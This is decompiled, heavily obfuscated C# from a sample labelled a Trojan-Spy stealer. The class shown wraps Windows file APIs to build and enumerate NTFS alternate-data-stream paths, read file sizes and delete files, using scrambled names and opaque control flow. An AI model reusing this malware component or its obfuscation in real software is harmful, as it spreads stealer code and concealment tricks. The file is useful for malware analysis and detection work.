// Decompiled with JetBrains decompiler
// Type: AvkJoyfOeh7dTxCa0j.JoT9B1cGuonqfreOpU
// Assembly: CLAIMVALUESATTRIBUT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 02CC8C23-A5FB-4ECC-B8C2-95BA2C4203FD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f4bef0754be1d8e60471746bb06004a86ab38cb0ffb281973fd45f81b610307e.exe

using HeavyDuck.Properties;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace AvkJoyfOeh7dTxCa0j
{
  internal static class JoT9B1cGuonqfreOpU
  {
    private static readonly char[] cAV88OsAFH;
    internal static JoT9B1cGuonqfreOpU ME8GglouYULBhpYJ6ka;

    [DllImport("kernel32.dll", EntryPoint = "FormatMessage", CharSet = CharSet.Auto, ThrowOnUnmappableChar = true, BestFitMapping = false)]
    private static extern int WnKB5NIZOx(
      int _param0,
      IntPtr _param1,
      int _param2,
      int _param3,
      StringBuilder _param4,
      int _param5,
      IntPtr _param6);

    [DllImport("kernel32", EntryPoint = "GetFileAttributes", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int CQDBaEa0R6(string _param0);

    [DllImport("kernel32", EntryPoint = "GetFileSizeEx", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool XfTBNGAnqc(
      SafeFileHandle _param0,
      out JoT9B1cGuonqfreOpU.sAFRM9tyQUrAbiiSym _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetFileType")]
    private static extern int BhvB34VMUo(SafeFileHandle _param0);

    [DllImport("kernel32", EntryPoint = "CreateFile", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern SafeFileHandle pdFBkfINWV(
      string _param0,
      JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA _param1,
      FileShare _param2,
      IntPtr _param3,
      FileMode _param4,
      JoT9B1cGuonqfreOpU.zKdLA5GCWWgVVulkXB _param5,
      IntPtr _param6);

    [DllImport("kernel32", EntryPoint = "DeleteFile", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool cIWBtnG5ba(string _param0);

    [DllImport("kernel32", EntryPoint = "BackupRead", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool fJeB6p4hkV(
      SafeFileHandle _param0,
      ref JoT9B1cGuonqfreOpU.mGVLdWvWbUDJ1sOaul _param1,
      int _param2,
      out int _param3,
      [MarshalAs(UnmanagedType.Bool)] bool _param4,
      [MarshalAs(UnmanagedType.Bool)] bool _param5,
      ref IntPtr _param6);

    [DllImport("kernel32", EntryPoint = "BackupRead", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool rldBdu11J1(
      SafeFileHandle _param0,
      vOv2GPjXtupMsnZgrX _param1,
      int _param2,
      out int _param3,
      [MarshalAs(UnmanagedType.Bool)] bool _param4,
      [MarshalAs(UnmanagedType.Bool)] bool _param5,
      ref IntPtr _param6);

    [DllImport("kernel32", EntryPoint = "BackupSeek", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SGTBs1crIO(
      SafeFileHandle _param0,
      int _param1,
      int _param2,
      out int _param3,
      out int _param4,
      ref IntPtr _param5);

    private static int bqyBEhWc1R(int _param0) => -2147024896 | _param0;

    private static string ACWBQFKHu2(int _param0)
    {
      int num = 1;
      StringBuilder stringBuilder;
      while (true)
      {
        switch (num)
        {
          case 1:
            stringBuilder = new StringBuilder(512);
            num = JoT9B1cGuonqfreOpU.S53xJdo9AsoJJWr7GHG() ? 0 : 0;
            continue;
          default:
            goto label_2;
        }
      }
label_2:
      if (JoT9B1cGuonqfreOpU.WnKB5NIZOx(12800, IntPtr.Zero, _param0, 0, stringBuilder, stringBuilder.Capacity, IntPtr.Zero) != 0)
        return stringBuilder.ToString();
      return string.Format((IFormatProvider) JoT9B1cGuonqfreOpU.XR9Yljoek7u50JfOQDa(), "", new object[1]
      {
        (object) _param0
      });
    }

    private static void y1hBov0NnG(int _param0, string _param1)
    {
      int num1 = _param0;
      int num2 = 2;
      if (!JoT9B1cGuonqfreOpU.S53xJdo9AsoJJWr7GHG())
        goto label_14;
label_1:
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (num1 == 2)
            {
              if (string.IsNullOrEmpty(_param1))
              {
                num2 = JoT9B1cGuonqfreOpU.S53xJdo9AsoJJWr7GHG() ? 3 : 3;
                continue;
              }
              goto label_8;
            }
            else
              goto label_12;
          case 2:
            if (num1 <= 2)
            {
              if (num1 == 0)
                goto label_18;
              else
                goto case 1;
            }
            else
            {
              num2 = JoT9B1cGuonqfreOpU.S53xJdo9AsoJJWr7GHG() ? 0 : 0;
              continue;
            }
          case 3:
            goto label_7;
          default:
            goto label_6;
        }
      }
label_18:
      return;
label_6:
      if (num1 == 87)
        throw new IOException(JoT9B1cGuonqfreOpU.ACWBQFKHu2(_param0), JoT9B1cGuonqfreOpU.bqyBEhWc1R(_param0));
      if (num1 == 206)
        throw new PathTooLongException();
      if (num1 == 995)
        throw new OperationCanceledException();
      goto label_12;
label_7:
      throw new FileNotFoundException();
label_8:
      throw new FileNotFoundException((string) null, _param1);
label_12:
      JoT9B1cGuonqfreOpU.MhsamooH67ChuBBhEGl(JoT9B1cGuonqfreOpU.bqyBEhWc1R(_param0));
      return;
label_14:
      num2 = 2;
      goto label_1;
    }

    public static void KZdBLJVd9b(string _param0)
    {
      int lastWin32Error = Marshal.GetLastWin32Error();
      bool flag = lastWin32Error != 0;
      int num1 = 0;
      if (JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() != null)
        goto label_7;
label_1:
      switch (num1)
      {
        default:
          if (!flag)
            return;
          if (0 <= Marshal.GetHRForLastWin32Error())
            throw new Win32Exception(lastWin32Error);
          JoT9B1cGuonqfreOpU.y1hBov0NnG(lastWin32Error, _param0);
          return;
      }
label_7:
      int num2;
      num1 = num2;
      goto label_1;
    }

    public static JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA VwXBMBpRB4(
      this FileAccess _param0)
    {
      JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA mcSna2WpttMlf1vA = (JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA) 0;
      if (FileAccess.Read != (FileAccess.Read & _param0))
        goto label_3;
      else
        goto label_6;
label_1:
      int num1;
      int num2 = num1;
label_2:
      bool flag;
      switch (num2)
      {
        case 1:
          if (flag)
            goto label_5;
label_4:
          return mcSna2WpttMlf1vA;
label_5:
          mcSna2WpttMlf1vA |= (JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA) 1073741824;
          goto label_4;
      }
label_3:
      flag = FileAccess.Write == (FileAccess.Write & _param0);
      num2 = 1;
      if (JoT9B1cGuonqfreOpU.S53xJdo9AsoJJWr7GHG())
        goto label_2;
      else
        goto label_1;
label_6:
      mcSna2WpttMlf1vA |= (JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA) 2147483648;
      if (JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() == null)
      {
        num2 = 0;
        goto label_2;
      }
      else
        goto label_1;
    }

    public static string RCiBuL615j(string _param0, string _param1)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      string str;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (!JoT9B1cGuonqfreOpU.QgHshIoX7lMfq2eNQ88((object) _param0))
            {
              if (1 == str.Length)
                goto label_11;
label_10:
              str = str + ":" + _param1 + ":$DATA";
              if (256 <= str.Length)
              {
                num2 = JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() == null ? 0 : 0;
                continue;
              }
              goto label_4;
label_11:
              str = ".\\" + str;
              goto label_10;
            }
            else
              goto label_5;
          case 2:
            str = _param0;
            if (JoT9B1cGuonqfreOpU.S53xJdo9AsoJJWr7GHG())
            {
              num2 = 1;
              continue;
            }
            goto label_1;
          default:
            goto label_7;
        }
      }
label_4:
label_5:
      return str;
label_7:
      str = "\\\\?\\" + str;
      goto label_4;
    }

    public static void tA2B2f0y0M(string _param0)
    {
    }

    public static int WskBIw1PBo(string _param0)
    {
      int num1 = 2;
label_1:
      int num2 = num1;
      bool flag;
      int lastWin32Error;
      int num3;
      while (true)
      {
        switch (num2)
        {
          case 1:
            if (!flag)
            {
              num3 = JoT9B1cGuonqfreOpU.CQDBaEa0R6(_param0);
              if (-1 == num3)
              {
                lastWin32Error = Marshal.GetLastWin32Error();
                if (JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() == null)
                {
                  num2 = 0;
                  continue;
                }
                goto label_1;
              }
              else
                goto label_8;
            }
            else
              goto label_10;
          case 2:
            flag = string.IsNullOrEmpty(_param0);
            num2 = JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() != null ? 1 : 1;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      if (2 != lastWin32Error)
        goto label_9;
label_7:
      goto label_8;
label_9:
      JoT9B1cGuonqfreOpU.KZdBLJVd9b(_param0);
      goto label_7;
label_8:
      return num3;
label_10:
      throw new ArgumentNullException("name");
    }

    public static bool zxoBKubbNo(string _param0)
    {
      bool flag1 = !string.IsNullOrEmpty(_param0) ? JoT9B1cGuonqfreOpU.cIWBtnG5ba(_param0) : throw new ArgumentNullException("name");
      bool flag2 = !flag1;
      int num1 = 0;
      if (JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() == null)
        goto label_10;
label_1:
      bool flag3;
      while (true)
      {
        switch (num1)
        {
          case 1:
            if (flag2)
            {
              flag3 = 2 != Marshal.GetLastWin32Error();
              int num2;
              num1 = JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() == null ? 0 : num2;
              continue;
            }
            goto label_8;
          default:
            goto label_5;
        }
      }
label_5:
      if (flag3)
        JoT9B1cGuonqfreOpU.KZdBLJVd9b(_param0);
label_8:
      return flag1;
label_10:
      num1 = 1;
      goto label_1;
    }

    public static SafeFileHandle sebBzUWDXJ(
      string _param0,
      JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA _param1,
      FileShare _param2,
      IntPtr _param3,
      FileMode _param4,
      JoT9B1cGuonqfreOpU.zKdLA5GCWWgVVulkXB _param5,
      IntPtr _param6)
    {
      SafeFileHandle safeFileHandle = JoT9B1cGuonqfreOpU.pdFBkfINWV(_param0, _param1, _param2, _param3, _param4, _param5, _param6);
      bool flag = !safeFileHandle.IsInvalid && 1 != JoT9B1cGuonqfreOpU.BhvB34VMUo(safeFileHandle);
      int num = 0;
      if (JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() == null)
        goto label_5;
label_1:
      switch (num)
      {
        default:
          if (flag)
            goto label_3;
label_2:
          return safeFileHandle;
label_3:
          safeFileHandle.Dispose();
          goto label_2;
      }
label_5:
      num = 0;
      goto label_1;
    }

    private static long vcN8RhCM4E(string _param0, SafeFileHandle _param1)
    {
      long num1 = 0;
      if (_param1 == null || JoT9B1cGuonqfreOpU.lWCZJlojrTcNd6hpeoH((object) _param1))
        goto label_5;
      else
        goto label_7;
label_1:
      long num2;
      int num3;
      switch (num3)
      {
        case 1:
          break;
        default:
          return num2;
      }
label_4:
label_5:
      num2 = num1;
      num3 = 0;
      if (!JoT9B1cGuonqfreOpU.S53xJdo9AsoJJWr7GHG())
      {
        int num4;
        num3 = num4;
        goto label_1;
      }
      else
        goto label_1;
label_7:
      JoT9B1cGuonqfreOpU.sAFRM9tyQUrAbiiSym afrM9tyQurAbiiSym;
      if (!JoT9B1cGuonqfreOpU.XfTBNGAnqc(_param1, out afrM9tyQurAbiiSym))
      {
        JoT9B1cGuonqfreOpU.KZdBLJVd9b(_param0);
        num3 = JoT9B1cGuonqfreOpU.Prqp29oNOBKNABqKLMs() != null ? 0 : 1;
        goto label_1;
      }
      else
      {
        num1 = afrM9tyQurAbiiSym.zKRvSLAoxd();
        goto label_4;
      }
    }

    public static long dq38UTmbv5(string _param0)
    {
      long num = 0;
      if (!string.IsNullOrEmpty(_param0))
        goto label_2;
label_1:
      return num;
label_2:
      SafeFileHandle safeFileHandle = (SafeFileHandle) JoT9B1cGuonqfreOpU.c2C0kKocvZG6HgaZlLE((object) _param0, (JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA) 2147483648, FileShare.Read, IntPtr.Zero, FileMode.Open, (JoT9B1cGuonqfreOpU.zKdLA5GCWWgVVulkXB) 0, IntPtr.Zero);
      try
      {
        num = JoT9B1cGuonqfreOpU.vcN8RhCM4E(_param0, safeFileHandle);
        goto label_1;
      }
      finally
      {
        if (safeFileHandle != null)
          JoT9B1cGuonqfreOpU.PfAKAfosTjek0hbose7((object) safeFileHandle);
      }
    }

    public static IList<JoT9B1cGuonqfreOpU.TSbHZ3VG26jJgP8j8J> M8A8BNp5Is(
      string _param0)
    {
      if (string.IsNullOrEmpty(_param0))
        throw new ArgumentNullException("filePath");
      List<JoT9B1cGuonqfreOpU.TSbHZ3VG26jJgP8j8J> tsbHz3Vg26jJgP8j8JList = new List<JoT9B1cGuonqfreOpU.TSbHZ3VG26jJgP8j8J>();
      using (SafeFileHandle safeFileHandle = JoT9B1cGuonqfreOpU.sebBzUWDXJ(_param0, (JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA) 2147483648, FileShare.Read, IntPtr.Zero, FileMode.Open, (JoT9B1cGuonqfreOpU.zKdLA5GCWWgVVulkXB) 33554432, IntPtr.Zero))
      {
        using (XnYcrXTUQBlLuZD9Ub ycrXtuqBlLuZd9Ub = new XnYcrXTUQBlLuZD9Ub())
        {
          if (!safeFileHandle.IsInvalid)
          {
            JoT9B1cGuonqfreOpU.mGVLdWvWbUDJ1sOaul structure = new JoT9B1cGuonqfreOpU.mGVLdWvWbUDJ1sOaul();
            int num1 = Marshal.SizeOf((object) structure);
            bool flag = false;
            IntPtr zero = IntPtr.Zero;
            int num2;
            try
            {
              while (!flag)
              {
                if (!JoT9B1cGuonqfreOpU.fJeB6p4hkV(safeFileHandle, ref structure, num1, out num2, false, false, ref zero))
                  flag = true;
                else if (num1 != num2)
                {
                  flag = true;
                }
                else
                {
                  string str;
                  if (0 >= structure.WjBvXEqFX1)
                  {
                    str = (string) null;
                  }
                  else
                  {
                    ycrXtuqBlLuZd9Ub.ieY8OYgaDa(structure.WjBvXEqFX1);
                    if (!JoT9B1cGuonqfreOpU.rldBdu11J1(safeFileHandle, ycrXtuqBlLuZd9Ub.Uop8TE4gBW(), structure.WjBvXEqFX1, out num2, false, false, ref zero))
                    {
                      str = (string) null;
                      flag = true;
                    }
                    else
                      str = ycrXtuqBlLuZd9Ub.b3Q8hgZeRk(num2 >> 1);
                  }
                  if (!string.IsNullOrEmpty(str))
                    tsbHz3Vg26jJgP8j8JList.Add(new JoT9B1cGuonqfreOpU.TSbHZ3VG26jJgP8j8J()
                    {
                      eohvgd9XMj = (VI7uiXCpSs1V0Udwt4) structure.pKnvbP6Thx,
                      sXiv1S6Fxr = (aEYL67Y2g1bUvIteYZ) structure.WldvAWbUVT,
                      IErvqT7Dv0 = structure.KpAvY1XYaI.zKRvSLAoxd(),
                      pduvZO4sDD = str
                    });
                  if (!flag && !JoT9B1cGuonqfreOpU.SGTBs1crIO(safeFileHandle, structure.KpAvY1XYaI.rVmve5x0do, structure.KpAvY1XYaI.rRFviRo10t, out int _, out int _, ref zero))
                    flag = true;
                }
              }
            }
            finally
            {
              JoT9B1cGuonqfreOpU.rldBdu11J1(safeFileHandle, ycrXtuqBlLuZd9Ub.Uop8TE4gBW(), 0, out num2, true, false, ref zero);
            }
          }
        }
      }
      return (IList<JoT9B1cGuonqfreOpU.TSbHZ3VG26jJgP8j8J>) tsbHz3Vg26jJgP8j8JList;
    }

    static JoT9B1cGuonqfreOpU()
    {
      YKUvaI4TsnyoXODJ2q.GJnKaSGoKIybi();
      JoT9B1cGuonqfreOpU.cAV88OsAFH = ((IEnumerable<char>) Path.GetInvalidFileNameChars()).Where<char>((Func<char, bool>) (c => c < '\u0001' || c > '\u001F')).ToArray<char>();
    }

    internal static bool S53xJdo9AsoJJWr7GHG() => JoT9B1cGuonqfreOpU.ME8GglouYULBhpYJ6ka == null;

    internal static JoT9B1cGuonqfreOpU Prqp29oNOBKNABqKLMs() => JoT9B1cGuonqfreOpU.ME8GglouYULBhpYJ6ka;

    internal static object XR9Yljoek7u50JfOQDa() => (object) Resources.tl08XT7ckd;

    internal static void MhsamooH67ChuBBhEGl([In] int obj0) => Marshal.ThrowExceptionForHR(obj0);

    internal static bool QgHshIoX7lMfq2eNQ88([In] object obj0) => string.IsNullOrEmpty((string) obj0);

    internal static bool lWCZJlojrTcNd6hpeoH([In] object obj0) => ((SafeHandle) obj0).IsInvalid;

    internal static object c2C0kKocvZG6HgaZlLE(
      [In] object obj0,
      JoT9B1cGuonqfreOpU.P0McSna2WPTTMlf1vA _param1,
      FileShare _param2,
      IntPtr _param3,
      FileMode _param4,
      JoT9B1cGuonqfreOpU.zKdLA5GCWWgVVulkXB _param5,
      IntPtr _param6)
    {
      return (object) JoT9B1cGuonqfreOpU.sebBzUWDXJ((string) obj0, _param1, _param2, _param3, _param4, _param5, _param6);
    }

    internal static void PfAKAfosTjek0hbose7([In] object obj0) => ((IDisposable) obj0).Dispose();

    [Flags]
    public enum zKdLA5GCWWgVVulkXB : uint
    {
    }

    [Flags]
    public enum P0McSna2WPTTMlf1vA : uint
    {
    }

    private struct sAFRM9tyQUrAbiiSym
    {
      public readonly int rVmve5x0do;
      public readonly int rRFviRo10t;
      private static object MMo0omCLCJWpugapURY;

      public long zKRvSLAoxd() => (long) this.rRFviRo10t * 4294967296L + (long) this.rVmve5x0do;

      internal static bool hhZF1FCxWuPNWfvojhw() => JoT9B1cGuonqfreOpU.sAFRM9tyQUrAbiiSym.MMo0omCLCJWpugapURY == null;

      internal static object JA9JJjC8SnJ3mPGgOeC() => JoT9B1cGuonqfreOpU.sAFRM9tyQUrAbiiSym.MMo0omCLCJWpugapURY;
    }

    private struct mGVLdWvWbUDJ1sOaul
    {
      public readonly int pKnvbP6Thx;
      public readonly int WldvAWbUVT;
      public JoT9B1cGuonqfreOpU.sAFRM9tyQUrAbiiSym KpAvY1XYaI;
      public readonly int WjBvXEqFX1;
    }

    public struct TSbHZ3VG26jJgP8j8J
    {
      public VI7uiXCpSs1V0Udwt4 eohvgd9XMj;
      public aEYL67Y2g1bUvIteYZ sXiv1S6Fxr;
      public long IErvqT7Dv0;
      public string pduvZO4sDD;
    }
  }
}
